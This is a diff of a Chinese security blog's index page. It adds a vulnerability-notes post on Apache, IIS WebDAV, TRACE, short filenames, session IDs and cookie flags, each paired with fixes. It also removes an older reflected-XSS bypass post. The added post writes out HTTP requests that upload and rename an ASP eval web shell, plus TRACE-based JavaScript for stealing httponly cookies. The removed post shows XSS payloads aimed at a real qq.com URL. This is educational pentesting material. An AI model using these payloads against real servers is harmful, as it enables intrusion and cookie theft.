@@ -194,6 +194,190 @@
           
           
             
+              <a class="post-title-link" href="/2015/08/13/漏洞记录-1/" itemprop="url">
+                漏洞记录-1
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-13T15:08:32+08:00" content="2015-08-13">
+            2015-08-13
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/13/漏洞记录-1/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/漏洞记录-1/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
+<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
+<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
+<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
+<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
+<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
+<p>3.利用：<br>-使用option探测服务器信息：</p>
+<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
+Host:www<span class="class">.xxxx</span><span class="class">.com</span>
+</code></pre><p>  返回：</p>
+<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+  MS-Author-Via:DAV
+  Content-Length:<span class="number">0</span>
+  Accept-Ranges:none
+  DASL:&lt;DAV:sql&gt;
+  DAV:<span class="number">1.2</span>
+Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+Cacha-Control:<span class="keyword">private</span>
+</code></pre><p>-上传文本文件：</p>
+<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
+<span class="string">Host:</span>www.xxxx.com
+Content-<span class="string">Length:</span><span class="number">26</span>
+&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/1.1 200 OK
+  Date:Fri,01 Jan 2011 04:23:39 GMT
+  Server: Microsoft-IIS/6.0
+  X-Powered-By:ASP.NET
+location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
+Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+//上传成功
+</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
+<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
+Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
+Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+location：www.xxxx.com/webshell.asp
+Content-type:text/xml
+Content-length:<span class="number">0</span>
+<span class="comment">//修改成功</span>
+</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
+<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
+<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
+<p>3.利用：</p>
+<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
+&lt;!--  
+<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
+<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
+xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
+xmlHttp.send();  
+xmlDoc=xmlHttp.responseText;  
+alert(xmlDoc);  
+}  
+<span class="comment">//--&gt;  </span>
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
+//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
+</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
+<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
+<ul>
+<li><p>过滤<code>~</code>字符.</p>
+</li>
+<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
+<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
+<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
+</li>
+</ul>
+<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
+<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
+<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
+</code></pre><p>也可以通过修改注册表实现：</p>
+<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
+值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
+</code></pre><ul>
+<li>使用waf进行防护.</li>
+</ul>
+<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
+<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
+<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
+<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
+<p>3.利用：可作为进一步渗透的信息储备</p>
+<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
+<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
+<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
+<pre><code>Java示例：
+HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
+response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
+
+C#示例：
+HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
+myCookie.HttpOnly = <span class="literal">true</span>; 
+<span class="built_in">Response</span>.AppendCookie(myCookie);
+
+VB.NET示例：
+<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
+myCookie.HttpOnly = <span class="literal">True</span> 
+<span class="built_in">Response</span>.AppendCookie(myCookie) 
+</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
+<blockquote>
+<p>IIS WebDav Options 方法未禁用</p>
+</blockquote>
+<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
+<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
+<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
+<p>示例：</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
+则增加“autocomplete”属性为“off”即可，修改为：
+&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="url">
                 SQL注入练级攻略(5)-5种注入类型
               </a>
@@ -996,8 +1180,7 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
 </tr>
 </tbody>
 </table>
-<pre><code>到这里需要安装的东西就没有啦~
-</code></pre><h2 id="二，使用virtualenv建立虚拟开发环境"> 二，使用virtualenv建立虚拟开发环境</h2><p>转到开发目录（cd filename / 打开filename  cd ..  /后退   mkdir filename/ 创建名为filename的文件）用到的3基本个命令<br>执行命令：virtualenvenv                   #创建名为env的环境<br>执行命令：source env/bin/activate   #进入env环境    这时命令行前面会有（env）这个标志<br>执行命令：pipfreeze                          #查看当前env目录下安装包的情况 正常情况下是什么都没有 或是默认安装几个重要包<br>执行命令：pip install django                #安装djangodjango框架安装在env环境中<br>再次执行：pip freeze                          #会发现多了一个django</p>
+<h2 id="二，使用virtualenv建立虚拟开发环境"> 二，使用virtualenv建立虚拟开发环境</h2><p>转到开发目录（cd filename / 打开filename  cd ..  /后退   mkdir filename/ 创建名为filename的文件）用到的3基本个命令<br>执行命令：virtualenvenv                   #创建名为env的环境<br>执行命令：source env/bin/activate   #进入env环境    这时命令行前面会有（env）这个标志<br>执行命令：pipfreeze                          #查看当前env目录下安装包的情况 正常情况下是什么都没有 或是默认安装几个重要包<br>执行命令：pip install django                #安装djangodjango框架安装在env环境中<br>再次执行：pip freeze                          #会发现多了一个django</p>
 <h2 id="三，使用django创建一个工程">三，使用django创建一个工程</h2><p>执行命令：django-admin.py startproject mysite #创建一个名为mysite的django工程<br>进入mysite目录：cd mysite<br>执行命令：python manage.py runserver<br>在浏览器地址栏输入：<a href="http://127.0.0.1:8000/" target="_blank" rel="external">http://127.0.0.1:8000/</a>      #会发现它已经在工作了</p>
 </span>
         
@@ -1828,102 +2011,6 @@ git <span class="keyword">push</span>                   <span class="preprocesso
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/10/反射型xss/" itemprop="url">
-                反射型XSS(心伤的瘦子)
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-10T10:47:07+08:00" content="2015-08-10">
-            2015-08-10
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/XSS漏洞/" itemprop="url" rel="index">
-                  <span itemprop="name">XSS漏洞</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/10/反射型xss/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/反射型xss/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="1-查看&lt;_/_&quot;等字符的过滤情况如果没有，直接X-">1.查看<code>&lt; / &quot;</code>等字符的过滤情况如果没有，直接X.</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015957" target="_blank" rel="external"> 什么都没过滤的入门情况</a></p>
-<h2 id="2-考虑用&amp;#x的形式代替，如果没有过滤&amp;_#_理论上可以代替任意字符，但是一般都会将&amp;过滤为&amp;amp-">2.考虑用<code>&amp;#x</code>的形式代替，如果没有过滤<code>&amp; #</code> 理论上可以代替任意字符，但是一般都会将&amp;过滤为<code>&amp;amp</code>. </h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015959" target="_blank" rel="external">输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间的情况</a>//这里构造的代码没懂<br><a href="http://www.wooyun.org/bugs/wooyun-2010-015963" target="_blank" rel="external">输出在HTML属性里的情况</a></p>
-<h2 id="3-gbXXXX系列的可以考虑使用宽字符%c0杀掉双引号，可能是因为过滤的正则写的有问题-">3.gbXXXX系列的可以考虑使用宽字符<code>%c0</code>杀掉双引号，可能是因为过滤的正则写的有问题.</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015969" target="_blank" rel="external">宽字节复仇记 [QQ邮箱基本通用]</a></p>
-<h2 id="4-`location-href=”………”+”&amp;ss=aaaa\”+”&amp;from==1;function_from(){}//“+”&amp;param=”;">4.`location.href=”………”+”&amp;ss=aaaa\”+”&amp;from==1;function from(){}//“+”&amp;param=”;</h2><p>如上所示代码：<br>1用\来闭合双引号,//注视掉后面代码<br>2将=改为==提高优先级<br>3可是在解析时浏览器提示from未声明，浏览器会优先解析function XXX(){} 的JS函数，添加如上代码<br>4发现空格被过滤掉了用/**/代替空格 </p>
-<h2 id="5-反斜线">5.反斜线</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015979" target="_blank" rel="external">反斜线复仇记</a></p>
-<h2 id="6-换行符">6.换行符</h2><pre><code><span class="number">5</span>.输出出现在注释中使用换行符<span class="escape">`%</span><span class="number">0</span><span class="literal">a</span><span class="escape">` </span>来使之后的代码生效。\.
-</code></pre><p><a href="http://www.wooyun.org/bugs/wooyun-2010-016003" target="_blank" rel="external">换行符复仇记</a></p>
-<h2 id="7-前面知识的综合应用">7.前面知识的综合应用</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//cgi</span>.data.tech.qq.com/<span class="keyword">index</span>.php?mod=search&amp;type=data&amp;site=digi&amp;libid=<span class="number">2</span>&amp;curpage=<span class="number">1</span>&amp;pagenum=<span class="number">30</span>&amp;filterattr=<span class="number">138</span>,<span class="number">138</span>|<span class="number">16</span>|<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>&amp;filtervalue=<span class="number">3500</span>-<span class="number">4000</span>,<span class="variable">%B4</span><span class="variable">%F3</span><span class="variable">%D3</span><span class="variable">%DA4000</span>|<span class="variable">%D0</span><span class="variable">%FD</span><span class="variable">%D7</span><span class="variable">%AA</span>|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa<span class="variable">%c0</span><span class="variable">%5c</span><span class="variable">%0aalert</span>(<span class="number">1</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure>
-<p>目标参数orderby</p>
-<pre><code><span class="number">1</span>.使用换行符<span class="escape">`%</span><span class="number">0</span><span class="literal">a</span><span class="escape">`使</span>JS代码生效
-<span class="number">2</span>.使用反斜线<span class="escape">`%</span><span class="number">5</span>c<span class="escape">`解</span>决语法错误，但是发现\被过滤为\\
-<span class="number">3</span>.使用宽字符<span class="escape">`%</span>c0<span class="escape">`杀</span>掉一个反斜线最终保留一个反斜线，成功构造如上代码
-</code></pre><p>以上资料来自<a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank" rel="external">心伤的瘦子</a>@<a href="http://www.wooyun.org" target="_blank" rel="external">乌云</a></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1962,7 +2049,7 @@ git <span class="keyword">push</span>                   <span class="preprocesso
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">32</span>
+              <span class="site-state-item-count">33</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
